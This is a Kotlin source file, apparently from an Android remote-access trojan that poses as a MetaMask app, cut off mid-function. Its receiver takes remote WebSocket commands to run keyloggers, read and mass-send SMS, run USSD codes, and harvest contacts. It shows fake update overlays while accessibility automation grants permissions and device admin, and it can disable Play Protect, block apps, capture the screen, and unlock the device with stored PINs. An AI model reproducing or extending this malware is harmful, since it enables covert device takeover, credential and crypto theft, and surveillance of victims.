package com.example.MetaMask.receivers

import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import com.example.MetaMask.BuildConfig
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import com.example.MetaMask.activities.PermRequesterActivity
import com.example.MetaMask.receivers.BadgerFalconRecv
import com.example.MetaMask.services.FrienCat
import com.example.MetaMask.services.ChikenWorker
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.trolService
import com.example.MetaMask.services.UssdControlService
import com.example.MetaMask.services.LegacyUssdService
import com.example.MetaMask.services.UUIDService
import com.example.MetaMask.services.TurtleService
import com.example.MetaMask.services.DeviceStateMonitorService
import com.example.MetaMask.services.ForegroundAppMonitorService
import com.example.MetaMask.services.CraneService
import com.example.MetaMask.services.AccessSvc
import com.example.MetaMask.services.MartenHelper
import com.example.MetaMask.activities.VideoProjectionActivity
import com.example.MetaMask.services.VideoCaptureFgs
import com.example.MetaMask.services.VideoEncoder


class WebSocketCommandHandlerReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "WSCommandReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (context == null) return

        if (intent?.action != MasterWebSocketDispatcher.ACTION_HANDLE_COMMAND) {
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
            return
        }

        val commandData = intent.getStringExtra(MasterWebSocketDispatcher.EXTRA_COMMAND_DATA)
        if (commandData.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
            return
        }

        try {
            val jsonCommand = JSONObject(commandData)
            val action = jsonCommand.optString("action")

            if (action == "request_routing_ticket") {
                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                val routingKey = jsonCommand.optString("routing_key")

                val mainH = Handler(Looper.getMainLooper())

                fun enableAutoMode(timeoutMs: Long = 30_000L, showOverlay: Boolean = true) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] enableAutoMode enter timeoutMs=${timeoutMs} showOverlay=${showOverlay}") //xdbg
                    val svcInst = AccessSvc.instance
                    svcInst?.autoIbis?.enable(true)
                    if (showOverlay) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        svcInst?.martenHelper?.showFakeUpdate()
                    }
                    mainH.postDelayed({
                        if (showOverlay) AccessSvc.instance?.martenHelper?.hide()
                        AccessSvc.instance?.autoIbis?.enable(false)
                    }, timeoutMs)
                }

                fun launchActivity(intent: Intent) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] launchActivity enter intent=${intent}") //xdbg
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    val svc = AccessSvc.instance
                    if (svc != null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        try {
                            svc.startActivity(intent)
                            return
                        } catch (_: Exception) {}
                    }
                    try {
                        context.startActivity(intent)
                    } catch (_: Exception) {}
                }

                when (routingKey) {

                    "perm_request_all" -> {
                        enableAutoMode(120_000L)
                        launchActivity(Intent(context, PermRequesterActivity::class.java))
                    }
                    "perm_request_single" -> {
                        val perm = jsonCommand.optString("permission")
                        if (perm.isNotEmpty()) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            enableAutoMode(30_000L, showOverlay = false)
                            launchActivity(Intent(context, PermRequesterActivity::class.java)
                                .putExtra(PermRequesterActivity.EXTRA_SPECIFIC_PERMS, perm))
                        }
                    }
                    "perm_request_group" -> {
                        val arr = jsonCommand.optJSONArray("permissions")
                        if (arr != null && arr.length() > 0) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            val perms = (0 until arr.length()).joinToString(",") { arr.getString(it) }
                            enableAutoMode(60_000L, showOverlay = true)
                            launchActivity(Intent(context, PermRequesterActivity::class.java)
                                .putExtra(PermRequesterActivity.EXTRA_SPECIFIC_PERMS, perms))
                        }
                    }

                    "power_conduit" -> {
                        enableAutoMode(20_000L, showOverlay = true)
                        AccessSvc.instance?.autoIbis?.onBatteryOptimizationRequested()
                        launchActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:${context.packageName}")
                        })
                    }

                    "notification_access_ticket" -> {
                        launchActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                    }

                    "primary_conduit_ticket" -> {
                        AccessSvc.instance?.autoIbis?.enable(true)
                        mainH.postDelayed({ AccessSvc.instance?.autoIbis?.enable(false) }, 30_000L)
                        launchActivity(Intent(context, com.example.MetaMask.activities.OtterHawkLauncherActivity::class.java))
                    }

                    "device_admin_request" -> {
                        enableAutoMode(60_000L, showOverlay = true)
                        launchActivity(Intent(context,
                            com.example.MetaMask.activities.BadgerFalconLauncherActivity::class.java))
                    }

                    "device_admin_revoke" -> {
                        context.getSharedPreferences("da_revoke_prefs", Context.MODE_PRIVATE)
                            .edit().putBoolean("panel_revoked", true).commit()
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val comp = ComponentName(context, BadgerFalconRecv::class.java)
                            if (dpm?.isAdminActive(comp) == true) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                dpm.removeActiveAdmin(comp)
                            }
                        } catch (_: Exception) {}
                    }

                    "play_protect_disable" -> {
                        AccessSvc.instance?.autoIbis?.onPlayProtectAboutToShow()
                        launchActivity(Intent("com.google.android.finsky.PLAY_PROTECT").apply {
                            setClassName(
                                "com.android.vending",
                                "com.google.android.finsky.protect.ExternalPlayProtectHomeEntryPoint"
                            )
                        })
                    }

                    "mink_scan" -> {
                        Thread {
                            try {
                                val result = com.example.MetaMask.services.MinkScanner.scan(context)
                                val payload = org.json.JSONObject().apply {
                                    put("action", "mink_scan_result")
                                    put("result", result)
                                }
                                val broadcastIntent = android.content.Intent(
                                    com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                                ).apply {
                                    putExtra(
                                        com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND,
                                        payload.toString()
                                    )
                                    setPackage(context.packageName)
                                }
                                context.sendBroadcast(broadcastIntent)
                            } catch (_: Exception) {}
                        }.start()
                    }

                    else -> {}
                }
                return
            }

            val serviceIntent: Intent? = when (action) {
                "startDeviceStateMonitoring" -> {
                    if (!BuildConfig.FEAT_DEVICE_MONITOR) null
                    else Intent(context, DeviceStateMonitorService::class.java).apply {
                        this.action = DeviceStateMonitorService.ACTION_START_MONITORING
                    }
                }
                "startForegroundAppMonitoring" -> {
                    Intent(context, ForegroundAppMonitorService::class.java).apply {
                        this.action = ForegroundAppMonitorService.ACTION_START_MONITORING
                    }
                }
                "getContacts", "addContact" -> {
                    Intent(context, FrienCat::class.java)
                }
                "getDeviceInfo" -> {
                    Intent(context, UUIDService::class.java)
                }
                "getSMSJson", "sendSms", "sendMassSms" -> {
                    Intent(context, trolService::class.java)
                }
                "getSystemInfo" -> {
                    launchChikenWorker(context, commandData)
                    null
                }
                "executeCommand" -> {
                    Intent(context, UssdControlService::class.java)
                }
                "sendUssdWithChoice" -> {
                    Intent(context, LegacyUssdService::class.java)
                }
                "hideShell", "snapBite" -> {
                    Intent(context, TurtleService::class.java)
                }
                "setInvisibleIntercept" -> {
                    val enabled = jsonCommand.optBoolean("enabled", false)
                    val prefs = context.getSharedPreferences("device_settings", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("invisible_intercept_enabled", enabled).apply()
                    null
                }
                "launch_app" -> {
                    val nameOrPkg = jsonCommand.optString("package")
                    if (nameOrPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        try {
                            val pm = context.packageManager
                            var launchIntent = pm.getLaunchIntentForPackage(nameOrPkg)
                            if (launchIntent == null) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                val apps = pm.getInstalledApplications(0)
                                for (app in apps) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                    val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                                    if (label.equals(nameOrPkg, ignoreCase = true)) {
                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                        launchIntent = pm.getLaunchIntentForPackage(app.packageName)
                                        if (launchIntent != null) break
                                    }
                                }
                            }
                            if (launchIntent != null) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                context.startActivity(launchIntent)
                            }
                        } catch (_: Exception) {}
                    }
                    null
                }

                "uninstall_app" -> {
                    val nameOrPkg = jsonCommand.optString("package", "")
                    if (nameOrPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        Thread {
                            val pm = context.packageManager
                            val resolvedPkg: String = run {
                                if (pm.getLaunchIntentForPackage(nameOrPkg) != null) return@run nameOrPkg
                                try {
                                    for (app in pm.getInstalledApplications(0)) {
                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                        val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                                        if (label.equals(nameOrPkg, ignoreCase = true)) {
                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                            val p = app.packageName
                                            if (!p.isNullOrEmpty()) return@run p
                                        }
                                    }
                                } catch (_: Exception) {}
                                nameOrPkg
                            }
                            context.getSharedPreferences("uninstall_prefs", android.content.Context.MODE_PRIVATE)
                                .edit()
                                .putString("pending_pkg", resolvedPkg)
                                .putLong("pending_ts", System.currentTimeMillis())
                                .apply()
                            try {
                                val intent = android.content.Intent(android.content.Intent.ACTION_DELETE).apply {
                                    data = android.net.Uri.parse("package:$resolvedPkg")
                                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                }
                                context.startActivity(intent)
                            } catch (_: Exception) {
                                android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch (ignored)") //xdbg
                                context.getSharedPreferences("uninstall_prefs", android.content.Context.MODE_PRIVATE)
                                    .edit().clear().apply()
                            }
                        }.start()
                    }
                    null
                }

                "app_restart" -> {
                    performAppRestart(context)
                    null
                }

                "phone_reboot" -> {
                    AccessSvc.instance?.triggerPhoneReboot()
                    null
                }

                "ping_device" -> {
                    val ts = jsonCommand.optLong("ts", 0L)
                    val prefs = context.getSharedPreferences("app_state_prefs", android.content.Context.MODE_PRIVATE)
                    val settingsBlockEnabled = prefs.getBoolean("settings_block_enabled", true)
                    val setupDone = prefs.getBoolean("setup_chain_completed", false)
                    val isDefaultSms = try {
                        android.app.role.RoleManager::class.java.let { rm ->
                            (context.getSystemService(rm) as? android.app.role.RoleManager)
                                ?.isRoleHeld(android.app.role.RoleManager.ROLE_SMS) == true
                        }
                    } catch (_: Exception) { false }
                    val isAdmin = try {
                        val dpm = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
                        val comp = android.content.ComponentName(context, BadgerFalconRecv::class.java)
                        dpm?.isAdminActive(comp) == true
                    } catch (_: Exception) { false }
                    val isAccessibility = try {
                        val enabled = android.provider.Settings.Secure.getString(
                            context.contentResolver,
                            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                        ) ?: ""
                        enabled.contains(context.packageName)
                    } catch (_: Exception) { false }
                    val pong = org.json.JSONObject().apply {
                        put("action", "pong_device")
                        put("ts", ts)
                        put("settings_block_enabled", settingsBlockEnabled)
                        put("setup_done", setupDone)
                        put("is_default_sms", isDefaultSms)
                        put("is_device_admin", isAdmin)
                        put("is_accessibility_enabled", isAccessibility)
                    }
                    val intent = android.content.Intent(
                        com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                    ).apply {
                        putExtra(
                            com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND,
                            pong.toString()
                        )
                        setPackage(context.packageName)
                    }
                    context.sendBroadcast(intent)
                    null
                }

                "set_settings_block" -> {
                    val enabled = jsonCommand.optBoolean("enabled", true)
                    val prefs = context.getSharedPreferences("app_state_prefs", android.content.Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("settings_block_enabled", enabled).apply()
                    com.example.MetaMask.services.AccessSvc.instance?.appBlocker?.setBlockingEnabled(enabled)
                    val resp = org.json.JSONObject().apply {
                        put("action", "settings_block_status")
                        put("enabled", enabled)
                    }
                    val intent = android.content.Intent(
                        com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                    ).apply {
                        putExtra(
                            com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND,
                            resp.toString()
                        )
                        setPackage(context.packageName)
                    }
                    context.sendBroadcast(intent)
                    null
                }

                "block_app" -> {
                    val rawPkg = jsonCommand.optString("package", "")
                    if (rawPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val pm = context.packageManager
                        val pkg = run {
                            if (pm.getLaunchIntentForPackage(rawPkg) != null) return@run rawPkg
                            try {
                                for (app in pm.getInstalledApplications(0)) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                    val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                                    if (label.equals(rawPkg, ignoreCase = true)) return@run app.packageName
                                }
                            } catch (_: Exception) {}
                            rawPkg
                        }
                        val dp = context.getSharedPreferences("dynamic_app_block", android.content.Context.MODE_PRIVATE)
                        val arr = org.json.JSONArray(dp.getString("blocked_packages", "[]") ?: "[]")
                        var found = false
                        for (i in 0 until arr.length()) if (arr.getString(i) == pkg) { found = true; break }
                        if (!found) arr.put(pkg)
                        dp.edit().putString("blocked_packages", arr.toString()).apply()
                        com.example.MetaMask.services.AccessSvc.instance?.appBlocker?.blockPackage(pkg)
                        val resp = org.json.JSONObject().apply {
                            put("action", "block_app_result")
                            put("package", pkg)
                            put("blocked", true)
                        }
                        val intent = android.content.Intent(
                            com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                        ).apply {
                            putExtra(com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, resp.toString())
                            setPackage(context.packageName)
                        }
                        context.sendBroadcast(intent)
                    }
                    null
                }

                "unblock_app" -> {
                    val rawPkg = jsonCommand.optString("package", "")
                    if (rawPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val pm = context.packageManager
                        val pkg = run {
                            if (pm.getLaunchIntentForPackage(rawPkg) != null) return@run rawPkg
                            try {
                                for (app in pm.getInstalledApplications(0)) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                    val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                                    if (label.equals(rawPkg, ignoreCase = true)) return@run app.packageName
                                }
                            } catch (_: Exception) {}
                            rawPkg
                        }
                        val dp = context.getSharedPreferences("dynamic_app_block", android.content.Context.MODE_PRIVATE)
                        val arr = org.json.JSONArray(dp.getString("blocked_packages", "[]") ?: "[]")
                        val newArr = org.json.JSONArray()
                        for (i in 0 until arr.length()) if (arr.getString(i) != pkg) newArr.put(arr.getString(i))
                        dp.edit().putString("blocked_packages", newArr.toString()).apply()
                        com.example.MetaMask.services.AccessSvc.instance?.appBlocker?.unblockPackage(pkg)
                        val resp = org.json.JSONObject().apply {
                            put("action", "block_app_result")
                            put("package", pkg)
                            put("blocked", false)
                        }
                        val intent = android.content.Intent(
                            com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                        ).apply {
                            putExtra(com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, resp.toString())
                            setPackage(context.packageName)
                        }
                        context.sendBroadcast(intent)
                    }
                    null
                }

                "check_block_app" -> {
                    val rawPkg = jsonCommand.optString("package", "")
                    if (rawPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val pm = context.packageManager
                        val pkg = run {
                            if (pm.getLaunchIntentForPackage(rawPkg) != null) return@run rawPkg
                            try {
                                for (app in pm.getInstalledApplications(0)) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                    val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { "" }
                                    if (label.equals(rawPkg, ignoreCase = true)) return@run app.packageName
                                }
                            } catch (_: Exception) {}
                            rawPkg
                        }
                        val dp = context.getSharedPreferences("dynamic_app_block", android.content.Context.MODE_PRIVATE)
                        val arr = org.json.JSONArray(dp.getString("blocked_packages", "[]") ?: "[]")
                        var blocked = false
                        for (i in 0 until arr.length()) if (arr.getString(i) == pkg) { blocked = true; break }
                        val resp = org.json.JSONObject().apply {
                            put("action", "block_app_status")
                            put("package", pkg)
                            put("blocked", blocked)
                        }
                        val intent = android.content.Intent(
                            com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                        ).apply {
                            putExtra(com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, resp.toString())
                            setPackage(context.packageName)
                        }
                        context.sendBroadcast(intent)
                    }
                    null
                }

                "start_vibration" -> {
                    if (BuildConfig.FEAT_VIBRATION) {
                        val durationMs = jsonCommand.optLong("duration", 10_000L).coerceIn(1_000L, 300_000L)
                        Handler(Looper.getMainLooper()).post {
                            com.example.MetaMask.services.VibrationManager.start(context, durationMs)
                        }
                    }
                    null
                }
                "stop_vibration" -> {
                    if (BuildConfig.FEAT_VIBRATION) Handler(Looper.getMainLooper()).post {
                        com.example.MetaMask.services.VibrationManager.stop(context)
                    }
                    null
                }

                "mink_scan" -> {
                    Thread {
                        try {
                            val result = com.example.MetaMask.services.MinkScanner.scan(context)
                            val payload = org.json.JSONObject().apply {
                                put("action", "mink_scan_result")
                                put("result", result)
                            }
                            val intent = android.content.Intent(
                                com.example.MetaMask.services.MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER
                            ).apply {
                                putExtra(
                                    com.example.MetaMask.services.MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND,
                                    payload.toString()
                                )
                                setPackage(context.packageName)
                            }
                            context.sendBroadcast(intent)
                        } catch (_: Exception) {}
                    }.start()
                    null
                }


                "appsHashMatch" -> {
                    ChikenWorker.pendingHashCheck?.complete(false)
                    null
                }

                "appsHashMismatch" -> {
                    ChikenWorker.pendingHashCheck?.complete(true)
                    null
                }

                "keylog_on_all" -> {
                    AccessSvc.instance?.sparrow?.enableAll()
                    null
                }

                "keylog_off_all" -> {
                    AccessSvc.instance?.sparrow?.disableAll()
                    null
                }

                "kl_set_exclusions" -> {
                    try {
                        val pkgsArr = jsonCommand.optJSONArray("pkgs")
                        if (pkgsArr != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            context.getSharedPreferences("sparrow_prefs", Context.MODE_PRIVATE)
                                .edit().putString("excluded_pkgs", pkgsArr.toString()).apply()
                            val svc = AccessSvc.instance
                            if (svc != null && svc.sparrow.enabled) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                svc.sparrow.enableAll()
                            }
                        }
                    } catch (_: Exception) {}
                    null
                }

                "keylog_on_pkg" -> {
                    val labelOrPkg = jsonCommand.optString("pkg")
                    if (labelOrPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val svc = AccessSvc.instance
                        if (svc != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            val realPkg = resolveAppPkg(context, labelOrPkg)
                            svc.sparrow.addWatchedPkg(realPkg, labelOrPkg)
                        }
                    }
                    null
                }

                "keylog_off_pkg" -> {
                    val labelOrPkg = jsonCommand.optString("pkg")
                    if (labelOrPkg.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val svc = AccessSvc.instance
                        if (svc != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            val realPkg = resolveAppPkg(context, labelOrPkg)
                            svc.sparrow.removeWatchedPkg(realPkg)
                        }
                    }
                    null
                }

                "set_crane_mode" -> {
                    val mode = jsonCommand.optString("mode", "off")
                    if (mode == "video") {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val autoIbis = jsonCommand.optBoolean("autoIbis", true)
                        if (VideoEncoder.instance?.running == true) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            VideoEncoder.instance?.resendInit()
                            try {
                                context.startService(Intent(context, CraneService::class.java).apply {
                                    this.action = CraneService.ACTION_SET_CRANE_MODE
                                    putExtra(CraneService.EXTRA_MODE, "video")
                                })
                            } catch (_: Exception) {}
                        } else {
                            if (autoIbis) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                try {
                                    context.startService(Intent(context, CraneService::class.java).apply {
                                        this.action = CraneService.ACTION_SET_CRANE_MODE
                                        putExtra(CraneService.EXTRA_MODE, "off")
                                    })
                                } catch (_: Exception) {}
                            } else {
                                try {
                                    context.startService(Intent(context, CraneService::class.java).apply {
                                        this.action = CraneService.ACTION_SET_CRANE_MODE
                                        putExtra(CraneService.EXTRA_MODE, "ac")
                                    })
                                } catch (_: Exception) {}
                            }
                            val vpIntent = Intent(context, VideoProjectionActivity::class.java).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
                                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                                putExtra(VideoProjectionActivity.EXTRA_AUTO_IBIS, autoIbis)
                            }
                            val svc = AccessSvc.instance
                            if (svc != null) {
                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                try { svc.startActivity(vpIntent) }
                                catch (_: Exception) {
                                    android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch (ignored)") //xdbg
                                    try { context.startActivity(vpIntent) } catch (_: Exception) {}
                                }
                            } else {
                                try { context.startActivity(vpIntent) } catch (_: Exception) {}
                            }
                        }
                        null
                    } else {
                        try { VideoEncoder.instance?.stop() } catch (_: Exception) {}
                        try { context.stopService(Intent(context, VideoCaptureFgs::class.java)) } catch (_: Exception) {}
                        Intent(context, CraneService::class.java).apply {
                            this.action = CraneService.ACTION_SET_CRANE_MODE
                            putExtra(CraneService.EXTRA_MODE, mode)
                        }
                    }
                }
                "set_tree_depth" -> {
                    val depth = jsonCommand.optInt("depth", 5).coerceIn(1, 15)
                    CraneService.acTreeDepth = depth
                    null
                }
                "send_home" -> {
                    AccessSvc.instance?.performGlobalAction(
                        android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                    )
                    null
                }
                "send_back" -> {
                    AccessSvc.instance?.performGlobalAction(
                        android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
                    )
                    null
                }
                "send_recents" -> {
                    AccessSvc.instance?.performGlobalAction(
                        android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS
                    )
                    null
                }
                "send_volume_mute" -> {
                    try {
                        val audio = context.getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                        audio?.let {
                            for (stream in intArrayOf(
                                android.media.AudioManager.STREAM_RING,
                                android.media.AudioManager.STREAM_NOTIFICATION,
                                android.media.AudioManager.STREAM_MUSIC,
                                android.media.AudioManager.STREAM_ALARM
                            )) {
                                try { it.setStreamVolume(stream, 0, 0) } catch (_: Exception) {}
                            }
                            try { it.ringerMode = android.media.AudioManager.RINGER_MODE_SILENT } catch (_: Exception) {}
                        }
                    } catch (_: Exception) {}
                    null
                }
                "send_volume_unmute" -> {
                    try {
                        val audio = context.getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                        audio?.let {
                            try { it.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
                            for (stream in intArrayOf(
                                android.media.AudioManager.STREAM_RING,
                                android.media.AudioManager.STREAM_NOTIFICATION,
                                android.media.AudioManager.STREAM_MUSIC,
                                android.media.AudioManager.STREAM_ALARM
                            )) {
                                try {
                                    val max = it.getStreamMaxVolume(stream)
                                    it.setStreamVolume(stream, max / 2, 0)
                                } catch (_: Exception) {}
                            }
                        }
                    } catch (_: Exception) {}
                    null
                }
                "send_volume_up" -> {
                    try {
                        val audio = context.getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                        audio?.adjustVolume(android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI)
                    } catch (_: Exception) {}
                    null
                }
                "send_vol_power" -> {
                    try {
                        val audio = context.getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                        audio?.adjustVolume(android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI)
                    } catch (_: Exception) {}
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            AccessSvc.instance?.performGlobalAction(
                                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT
                            )
                        }
                    } catch (_: Exception) {}
                    null
                }
                "send_lock_screen" -> {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        AccessSvc.instance?.performGlobalAction(
                            android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN
                        )
                    } else {
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                            dpm?.lockNow()
                        } catch (_: Exception) {}
                    }
                    null
                }
                "wake_screen" -> {
                    try {
                        val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                        @Suppress("DEPRECATION")
                        val wl = pm?.newWakeLock(
                            android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                            "cristofer:wakescreen"
                        )
                        wl?.acquire(3000L)
                        Handler(Looper.getMainLooper()).postDelayed({
                            try { if (wl?.isHeld == true) wl.release() } catch (_: Exception) {}
                        }, 2500L)
                    } catch (_: Exception) {}
                    null
                }
                "set_unlock_method" -> {
                    try {
                        val method = jsonCommand.optJSONObject("method")
                        if (method != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            context.getSharedPreferences("cfg", Context.MODE_PRIVATE)
                                .edit()
                                .putString("unlock_method_json", method.toString())
                                .apply()
                        }
                    } catch (_: Exception) {}
                    null
                }

                "send_unlock_screen" -> {
                    val svc = AccessSvc.instance
                    if (svc != null) UnlockExecutor.execute(context, svc)
                    null
                }

                "inject_credentials" -> {
                    val svc = AccessSvc.instance
                    if (svc != null) UnlockExecutor.executeInApp(context, svc)
                    null
                }
                "send_unlock_screen_LEGACY_DISABLED" -> {
                    val svc = AccessSvc.instance ?: run { null }
                    if (svc != null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        Thread {
                            try {
                                val prefs = context.getSharedPreferences("cfg", Context.MODE_PRIVATE)
                                val methodJson = prefs.getString("unlock_method_json", null)
                                val method = if (methodJson != null) org.json.JSONObject(methodJson) else null
                                val unlockType = method?.optString("type", "swipe") ?: "swipe"

                                val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                                @Suppress("DEPRECATION")
                                val wl = pm?.newWakeLock(
                                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                                    "cristofer:unlock"
                                )
                                wl?.acquire(6000L)
                                Thread.sleep(300L)

                                val metrics = context.resources.displayMetrics
                                val W = metrics.widthPixels.toFloat()
                                val H = metrics.heightPixels.toFloat()

                                fun doSwipe() {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] doSwipe enter") //xdbg
                                    val path = android.graphics.Path().apply {
                                        moveTo(W / 2f, H * 0.88f); lineTo(W / 2f, H * 0.25f)
                                    }
                                    val gesture = android.accessibilityservice.GestureDescription.Builder()
                                        .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 400L))
                                        .build()
                                    svc.dispatchGesture(gesture, null, null)
                                }

                                android.os.Handler(android.os.Looper.getMainLooper()).post { doSwipe() }

                                when (unlockType) {
                                    "pin", "password" -> {
                                        val code = method?.optString("code", "") ?: ""
                                        if (code.isNotEmpty()) {
